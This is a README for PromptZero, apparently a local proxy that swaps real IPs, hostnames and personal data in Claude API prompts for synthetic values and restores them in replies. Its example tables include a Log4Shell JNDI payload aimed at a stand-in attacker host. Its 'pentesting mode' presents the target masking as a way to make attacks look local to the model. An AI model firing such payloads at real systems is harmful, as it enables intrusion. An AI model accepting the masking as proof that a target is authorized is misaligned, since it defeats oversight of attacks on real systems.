```
██████╗ ██████╗  ██████╗ ███╗   ███╗██████╗ ████████╗    ███████╗███████╗██████╗  ██████╗
██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗╚══██╔══╝    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
██████╔╝██████╔╝██║   ██║██╔████╔██║██████╔╝   ██║          ███╔╝ █████╗  ██████╔╝██║   ██║
██╔═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██╔═══╝    ██║         ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
██║     ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║        ██║        ███████╗███████╗██║  ██║╚██████╔╝
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝        ╚═╝        ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝
```

<div align="center">

**Zero trace. Full answer.**
*El modelo ve ficción. Vos recibís la realidad.*

[![Version](https://img.shields.io/badge/version-2.2.0-blue.svg)](https://github.com/openbash/promptzero)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![OpenBash](https://img.shields.io/badge/by-OpenBash.com-red.svg)](https://openbash.com)
[![From pentesters](https://img.shields.io/badge/from%20pentesters-to%20pentesters-orange.svg)](https://openbash.com)

</div>

---

> **PromptZero** is a local, transparent proxy for the Claude API that detects and replaces
> sensitive data in your prompts **before** they leave your environment — then restores
> real values in the response. Your infrastructure, identities, and findings stay home.
> Always.

---

## The Problem

You use AI to analyze logs, write pentest reports, review code, summarize contracts.
But every prompt you send contains real IPs, real hostnames, real names, real credentials.

**That data goes to a third-party server. Every time.**

```
You type:                          Claude receives:
─────────────────────────────      ─────────────────────────────
"Analyze traffic from              "Analyze traffic from
 192.168.1.45 targeting             192.168.1.45 targeting
 db.prod.company.com                db.prod.company.com     ← your real infra
 Credentials: admin:P@ss1"          Credentials: admin:P@ss1"  ← your real creds
```

PromptZero fixes this.

---

## How It Works

```
╔══════════════════════════════════════════════════════════════════════╗
║                        YOUR ENVIRONMENT                              ║
║                                                                      ║
║  ┌─────────────┐     ┌──────────────────────────────┐               ║
║  │  Your App   │────▶│         PromptZero            │               ║
║  │  Script     │     │       localhost:8000           │               ║
║  │  Agent      │◀────│                               │               ║
║  └─────────────┘     │  ① Detect  → PII, IPs, hosts │               ║
║                       │  ② Replace → synthetic data  │               ║
║                       │  ③ Forward → clean prompt    │               ║
║                       │  ④ Receive → AI response     │               ║
║                       │  ⑤ Restore → real values     │               ║
║                       └──────────────┬───────────────┘               ║
║                                      │                               ║
║         ✗ Real data NEVER            │  Only synthetic               ║
║           crosses this line          │  data crosses here            ║
╚══════════════════════════════════════│══════════════════════════════╝
                                       │
                              ┌────────▼────────┐
                              │    Claude API    │
                              │  (sees fiction,  │
                              │  answers facts)  │
                              └─────────────────┘
```

### Before & After

```
YOUR PROMPT (real data)              WHAT CLAUDE SEES (synthetic)
══════════════════════════           ════════════════════════════════
192.168.1.45              ────▶      127.0.0.1
db.prod.company.com       ────▶      localhost.localdomain.1
admin@company.com         ────▶      user001@fakecorp.local
John Smith                ────▶      Alice Harrington          (NLP)
Acme Financial S.A.       ────▶      Globex Industries         (NLP)
+54 11 4444-5555          ────▶      +1-555-000-0001
DNI 28.456.123            ────▶      FAKE-ID-000001
sk-ant-api03-xxxxx...     ────▶      FAKE_TOKEN_0001_xxxxxxxx
${jndi:ldap://evil.com/x} ────▶      ${jndi:ldap://localhost.localdomain.2/x}


CLAUDE'S RESPONSE (synthetic)        YOU RECEIVE (real data restored)
════════════════════════════         ═════════════════════════════════
"127.0.0.1 shows signs    ────▶      "192.168.1.45 shows signs
 of lateral movement to               of lateral movement to
 localhost.localdomain.1"             db.prod.company.com"
```

---

## What Gets Protected

| Data Type | Real → Synthetic | Detection |
|---|---|---|
| IPv4 address | `203.0.113.50` → `127.0.0.1` | Regex |
| IPv6 address | `2001:db8::1` → `::1` | Regex |
| Hostname / FQDN | `vpn.corp.com` → `localhost.localdomain.1` | Regex |
| URL | `https://api.corp.com/v2` → `https://localhost.localdomain.2/v2` | Regex |
| host:port | `db.internal:5432` → `localhost.localdomain.3:5432` | Regex |
| Email | `john@corp.com` → `user001@fakecorp.local` | Regex + NLP |
| Phone (US/CA) | `+1-555-123-4567` → `+1-555-000-0001` | Regex + NLP |
| Phone (LatAm + ES) | `+54 11 4444-5555`, `+56 9 1234 5678`, `+34 612 345 678`, `+52 55 1234 5678`, `+57 300 123 4567`, `+598 99 123 456` → `+1-555-000-0001` | **Regex (LatAm/ES)** |
| Person name | `John Smith`, `María Fernández` | **NLP (spaCy en+es)** |
| Organization | `Acme Corp S.A.`, `Nexabank Financial S.A.` | **NLP (spaCy en+es)** |
| Argentina DNI | `DNI 28.456.123` → `DNI 11.111.001` | **Regex (AR)** |
| Argentina CUIT/CUIL | `20-12345678-9` → `20-11111001-1` | **Regex (AR)** |
| Chile RUT | `12.345.678-K` → `11.111.001-1` | **Regex (CL)** |
| Spain DNI/NIE | `12345678A`, `X1234567A` → `X0000001A` | **Regex (ES) + NLP** |
| Uruguay CI | `1.234.567-8` → `1.111.001-1` | **Regex (UY)** |
| Colombia CC | `CC 1.234.567` → `CC 1.111.001` | **Regex (CO)** |
| Mexico CURP | `AAAA000000HAAAAA00` → `FAKE000001HDFXXX11` | **Regex (MX)** |
| Mexico RFC | `AAAA000000AAA` → `FAKE000001XX1` | **Regex (MX)** |
| Passport | `AAB123456` → `XX0000001` | **NLP (Presidio)** |
| SSN | `123-45-6789` → `000-00-0001` | Regex + NLP |
| Credit card | `4111 1111 1111 1234` → `4111-1111-1111-0001` | Regex + NLP |
| IBAN | `GB29NWBK60161331926819`, `AR1500011110000…` → `FAKEIBAN000…` | NLP |
| API key / Token | `sk-ant-api03-xxxxxx...` → `FAKE_TOKEN_0001_xxxxxxxx` | Regex |

> **Pentesting mode:** IPs map to `127.0.0.x` and hostnames to `localhost.localdomain.x` —
> this frames your tests as local, avoids WAF/IDS triggers, and is accurate since you're
> running tests from a controlled environment anyway.

---

## Architecture

```
promptzero/
├── main.py          ← FastAPI proxy server (drop-in for api.anthropic.com)
├── sanitizer.py     ← Detection engine: NLP (Presidio+spaCy) + Regex layers
├── setup.sh         ← One-command setup
├── requirements.txt
├── .env.example
└── examples/
    ├── poc/                ← Proof-of-concept: 5 fictitious datasets + demo scripts (local + Claude E2E)
    ├── document_summary/   ← Summarize PDF/DOCX/TXT with PII protection
    └── pentest_report/     ← Generate full pentest reports from findings JSON
```

### Detection layers

```
Text input
    │
    ├─▶ [ NLP Layer — Presidio + spaCy (en + es) ]
    │     PERSON, ORGANIZATION, PHONE, EMAIL,
    │     CREDIT_CARD, IBAN, SSN, PASSPORT,
    │     NATIONAL_ID (ES_NIF, NRP), URL, IP_ADDRESS
    │
    ├─▶ [ Regex Layer — country-specific PII ]
    │     AR: DNI, CUIT/CUIL          CL: RUT
    │     ES: DNI/NIE                 UY: CI
    │     CO: Cédula (CC)             MX: CURP, RFC
    │     Phones: +34 +52 +54 +55 +56 +57 +598
    │
    ├─▶ [ Regex Layer — network & infra ]
    │     IPv4, IPv6, hostnames, host:port,
    │     long tokens/API keys, URLs
    │
    └─▶ [ Merge & deduplicate by span ]
          └─▶ Replace real → synthetic
                └─▶ Store in session mapping table
```

### Session mapping

Each conversation gets a **session-scoped bidirectional mapping table**.
The same real value always maps to the same synthetic value within a session —
so your conversation stays coherent end-to-end.

```
Session: "pentest-acmecorp-2024"
─────────────────────────────────────────────────
Real value                   Synthetic value
─────────────────────────────────────────────────
192.168.1.45        ←──────▶  127.0.0.1
db.prod.acme.com    ←──────▶  localhost.localdomain.1
John Smith          ←──────▶  Alice Harrington
admin@acme.com      ←──────▶  user001@fakecorp.local
─────────────────────────────────────────────────
           Stored locally. Never sent anywhere.
```

---

## Quick Start

```bash
# Clone
git clone https://github.com/openbash/promptzero
cd promptzero

# Setup (installs deps + downloads spaCy NLP models en + es)
./setup.sh

# Configure
cp .env.example .env
# → edit .env and add your ANTHROPIC_API_KEY

# Run
python main.py
# Listening on http://localhost:8000
```

> Setup downloads spaCy models for **English + Spanish** by default
> (≈560 MB each — covers AR, CL, CO, ES, MX, PE, UY and English text).
> Use `./setup.sh medium` (~40 MB) or `./setup.sh small` (~12 MB) for
> lighter installs, or `./setup.sh en-only` if you only process English.

---

## Usage

PromptZero is a **drop-in replacement** for `https://api.anthropic.com`.
One line change. Everything else stays the same.

### Python SDK

```python
import anthropic

client = anthropic.Anthropic(
    api_key="your-api-key",
    base_url="http://localhost:8000",   # ← only change
)

message = client.messages.create(
    model="claude-opus-4-6",
    max_tokens=1024,
    messages=[{
        "role": "user",
        "content": "Analyze traffic from 10.0.1.42 to db.prod.corp:5432. User: john@corp.com"
    }],
    extra_headers={"x-session-id": "my-session"},  # keeps mapping consistent
)

print(message.content[0].text)
# → Real IPs and email are restored in the response
```

### curl

```bash
curl http://localhost:8000/v1/messages \
  -H "x-api-key: $ANTHROPIC_API_KEY" \
  -H "x-session-id: my-session" \
  -H "anthropic-version: 2023-06-01" \
  -H "content-type: application/json" \
  -d '{
    "model": "claude-opus-4-6",
    "max_tokens": 1024,
    "messages": [{
      "role": "user",
      "content": "The payload hit 203.0.113.5:8443 — what does this CVE-2024-21762 exploit look like?"
    }]
  }'
```

### Management endpoints

```bash
# Health check
GET  /health

# Inspect what PromptZero mapped in a session (debug)
GET  /sessions/{session_id}/mappings

# Reset a session's mapping table
DELETE /sessions/{session_id}
```

### Routing the Claude Code CLI through PromptZero

The proxy is a drop-in replacement for `api.anthropic.com`, so the Claude Code
CLI works through it with a single env var:

```bash
# Start PromptZero (terminal 1)
python main.py

# Run Claude Code via the proxy (terminal 2)
export ANTHROPIC_BASE_URL=http://localhost:8000
claude

# Every prompt typed in the CLI is now sanitized before reaching Claude,
# and Claude's responses are desanitized before reaching your terminal.
```

What the proxy handles for the CLI:

| Route | Behaviour |
|---|---|
| `POST /v1/messages`             | Sanitized → forwarded. Response desanitized. Streaming OK. |
| `POST /v1/messages/count_tokens`| Sanitized so token counts reflect the sanitized prompt.    |
| Anything else under `/v1/*`     | Forwarded unchanged (`models`, `organizations`, `files`, `batches`, …) |

Verify Claude Code is going through the proxy:

```bash
# In a third terminal — watch active sessions grow as you use the CLI
watch -n 1 'curl -s http://localhost:8000/health'

# Inspect what got mapped in the last session
curl -s http://localhost:8000/sessions/<id>/mappings | jq
```

### Inspecting upstream traffic with Burp Suite (or mitmproxy)

Want to *prove* nothing sensitive leaves your machine? Route PromptZero's
upstream connection (PromptZero → `api.anthropic.com`) through Burp and
inspect every byte. Two env vars in `.env`:

```bash
# Send PromptZero → api.anthropic.com traffic through Burp
UPSTREAM_PROXY=http://127.0.0.1:8080

# Burp does TLS interception with its own CA — either trust it
# explicitly (recommended):
UPSTREAM_CA_BUNDLE=/Users/you/burp-ca.pem
# …or skip verification for a quick demo (insecure):
UPSTREAM_VERIFY=false
```

Steps:

1. **Export Burp's CA cert as PEM**
   `Burp → Proxy → Settings → Import / export CA certificate → "Certificate in PEM format"`
   Save it as `~/burp-ca.pem`.

2. **Enable Burp's proxy listener** on `127.0.0.1:8080` (default).

3. **Set the env vars in `.env`** (snippet above) and restart `python main.py`.

4. **Confirm via /health** that the proxy picked up the config:
   ```bash
   curl -s http://localhost:8000/health | jq
   # → "upstream_proxy": "http://127.0.0.1:8080"
   #   "upstream_verify": "/Users/you/burp-ca.pem"
   ```

5. **Run your client** as usual (`claude`, `python demo_claude.py`, `curl`…).

6. **Inspect in Burp** — open the HTTP history. Every request to
   `api.anthropic.com/v1/messages` shows the **sanitized** body. Filter
   the history for any real value from your dataset (`nexabank`, `DNI`,
   your real IP) — the result is empty. That's the proof.

```
┌─────────┐  HTTP   ┌────────────┐  HTTPS   ┌──────────┐  HTTPS  ┌─────────────────┐
│ Claude  │────────▶│ PromptZero │─────────▶│   Burp   │────────▶│ api.anthropic   │
│  CLI    │  clear  │   :8000    │  TLS     │  :8080   │  TLS    │     .com        │
└─────────┘         │ sanitize   │          │  MITM    │         └─────────────────┘
                    │ desanitize │          │ inspect  │
                    └────────────┘          └──────────┘
```

`mitmproxy` works the same way — set `UPSTREAM_PROXY=http://127.0.0.1:8081`
and `UPSTREAM_CA_BUNDLE=~/.mitmproxy/mitmproxy-ca-cert.pem`.

---

## Examples

### Proof of Concept

The fastest way to *see* PromptZero in action — five fictitious datasets (personal
data, full pentest engagement with HTTP req/res + payloads, injection catalog,
incident response, support chat) plus two demo scripts.

```bash
cd examples/poc

# Standalone — no API call, prints original / sanitized / desanitized
# + the full real↔fake mapping table.
python demo_local.py
python demo_local.py data/01_personal_records.json

# Visual HTML report — best for video demos. Side-by-side highlights,
# colour by category, hover-to-link real↔fake, mapping table.
python demo_html.py --open
python demo_html.py --with-claude --task triage \
    --dataset data/04_incident_response.json --out ir.html --open

# End-to-end against the real Claude API (proxy must be running)
python demo_claude.py
python demo_claude.py --dataset data/04_incident_response.json --task triage
```

See [`examples/poc/README.md`](examples/poc/README.md) for the full dataset catalog,
script options, and audience-facing talking points.

### Document Summary

Summarize any document (PDF, DOCX, TXT, log) with full PII protection.

```bash
cd examples/document_summary
pip install -r requirements.txt

python summarize.py contract.pdf
python summarize.py incident_report.docx --mode executive --lang es
python summarize.py access.log --mode technical
```

### Pentest Report Generator

Generate professional pentest reports from a structured findings JSON.
IPs, hostnames, client names, credentials, and payloads are all protected.

```bash
cd examples/pentest_report
pip install -r requirements.txt

# Full technical report
python report.py findings.json

# Executive summary in Spanish
python report.py findings.json --mode executive --lang es --out ejecutivo.md

# Remediation checklist
python report.py findings.json --mode remediation --out fixes.md

# Protect short passwords the proxy might miss
python report.py findings.json --protect "P@ssw0rd1" "Summer2023!"
```

See [`examples/pentest_report/sample_findings.json`](examples/pentest_report/sample_findings.json)
for a complete example with 6 realistic findings (critical → low).

---

## Why PromptZero?

```
                    SaaS Vendors          PromptZero
                    (Private AI,          (this project)
                     Protecto, etc.)
                   ─────────────────      ──────────────────
Data leaves env?    YES — goes to them    NO — stays local
Cost                Per-volume billing   Free / open source
Works offline       No                   Yes
Pentesting-aware    No                   Yes (127.0.0.x)
Customizable        Limited              Full source access
Auditable           No                   Yes
Paradox-free        No*                  Yes

* Sending private data to a third party so they can "protect" it
  before sending it to another third party is not privacy.
```

---

## About OpenBash

**PromptZero** is a project by [OpenBash.com](https://openbash.com) —
a community built **from pentesters, to pentesters**.

We build open-source security tools that help the community work smarter,
stay protected, and keep sensitive data where it belongs: at home.

If this tool helps you, share it. If you find a bug, open an issue.
If you improve it, send a PR.

---

## Contributing

```bash
# Fork → clone → branch
git checkout -b feature/my-improvement

# Make changes, test manually
python main.py &
# test your changes against localhost:8000

# Submit PR to main
```

Ideas for contributions:
- Additional language support (spaCy models for ES, PT, FR, DE)
- Persistent session storage (SQLite / Redis)
- More examples (`log_analyzer`, `code_reviewer`, `nessus_parser`)
- CLI wrapper (`promptzero "your prompt here"`)
- Docker image

---

## License

MIT — free to use, modify, distribute.
Attribution appreciated but not required.

---

---

# Versión en Español

---

## ¿Qué es PromptZero?

**PromptZero** es un proxy local y transparente para la API de Claude que detecta y reemplaza
datos sensibles en tus prompts **antes** de que salgan de tu entorno — y restaura los valores
reales en la respuesta. Tu infraestructura, identidades y hallazgos siempre se quedan en casa.

**Slogan:** *Cero rastro. Respuesta real.*

---

## El Problema

Usás IA para analizar logs, escribir reportes de pentesting, revisar código, resumir contratos.
Pero cada prompt que enviás contiene IPs reales, hostnames reales, nombres reales, credenciales reales.

**Esos datos van a un servidor de terceros. Siempre.**

PromptZero lo resuelve interceptando cada request localmente, reemplazando los datos sensibles
por equivalentes sintéticos consistentes, y restaurando los valores reales en la respuesta.

---

## Cómo Funciona

```
TU ENTORNO
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Tu App/Script ──▶ PromptZero (localhost:8000)              │
│       ▲                │                                    │
│       │                ① Detectar PII, IPs, hosts           │
│       │                ② Reemplazar con datos ficticios      │
│       └────────────────③ Reenviar prompt limpio             │
│                        ④ Recibir respuesta de Claude        │
│                        ⑤ Restaurar valores reales           │
│                                                             │
│         ✗ Los datos reales NUNCA cruzan este límite         │
└───────────────────────────────────┬─────────────────────────┘
                                    │ Solo datos sintéticos
                             ┌──────▼──────┐
                             │  Claude API  │
                             │ (ve ficción, │
                             │ responde OK) │
                             └─────────────┘
```

---

## Datos que protege

| Tipo | Dato real | Dato sintético |
|---|---|---|
| IP (pentesting) | `192.168.1.45` | `127.0.0.1` |
| Hostname | `db.prod.empresa.com` | `localhost.localdomain.1` |
| Email | `juan@empresa.com` | `user001@fakecorp.local` |
| Nombre / Apellido | `Juan García` | `Alice Harrington` |
| Empresa | `Empresa XYZ S.A.` | `Globex Industries` |
| Teléfono | `+54 11 4444-5555` | `+1-555-000-0001` |
| DNI / Documento | `28.456.123` | `FAKE-ID-000001` |
| Tarjeta de crédito | `4111 1111 1111 1234` | `4111-1111-1111-0001` |
| Token / API key | `sk-ant-api03-xxx...` | `FAKE_TOKEN_0001_xxxxxxxx` |
| Payload con host | `${jndi:ldap://evil.com}` | `${jndi:ldap://localhost.localdomain.2}` |

> **Modo pentesting:** Las IPs se mapean a `127.0.0.x` y los hostnames a
> `localhost.localdomain.x` — esto enmarca los tests como locales, evita alertas
> de WAF/IDS y es técnicamente correcto ya que las pruebas se realizan desde
> infraestructura controlada.

---

## Inicio rápido

```bash
git clone https://github.com/openbash/promptzero
cd promptzero

./setup.sh          # instala todo + modelo NLP (~560 MB)
./setup.sh small    # modelo más liviano (~12 MB, menos preciso)

cp .env.example .env
# → agregar ANTHROPIC_API_KEY

python main.py
```

Solo cambiás `base_url` en tu SDK:

```python
client = anthropic.Anthropic(
    api_key="tu-api-key",
    base_url="http://localhost:8000",  # ← único cambio
)
```

---

## Ejemplos incluidos

```bash
# Resumir un documento con PII protegida
cd examples/document_summary
python summarize.py contrato.pdf --lang es

# Generar reporte de pentesting desde findings.json
cd examples/pentest_report
python report.py findings.json --mode executive --lang es --out reporte.md
python report.py findings.json --protect "P@ssw0rd1" "token_secreto"
```

---

## Sobre OpenBash

**PromptZero** es un proyecto de [OpenBash.com](https://openbash.com) —
una comunidad construida **de pentesters para pentesters**.

Construimos herramientas de seguridad open source para que la comunidad pueda
trabajar mejor, mantenerse protegida y conservar sus datos sensibles donde corresponde: en casa.

Si esta herramienta te sirve, compartila. Si encontrás un bug, abrí un issue.
Si la mejorás, mandá un PR.

---

*Made with ♥ by the OpenBash community*
